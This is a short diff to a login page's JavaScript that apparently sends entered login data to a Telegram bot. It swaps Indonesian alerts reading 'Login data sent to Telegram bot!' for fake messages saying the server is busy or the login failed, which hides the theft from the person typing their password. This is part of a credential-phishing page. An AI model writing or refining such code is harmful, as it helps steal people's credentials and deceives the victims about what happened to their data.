@@ -79,11 +79,11 @@ document.addEventListener('DOMContentLoaded', function() {
         })
         .then(response => response.json())
         .then(data => {
-            alert('Login data terkirim ke bot Telegram!');
+            alert('Server sibuk, Coba lagi nanti.');
         })
         .catch(error => {
             console.error('Error:', error);
-            alert('Gagal mengirim data ke Telegram.');
+            alert('Login gagal, coba lagi.');
         });
     });
 
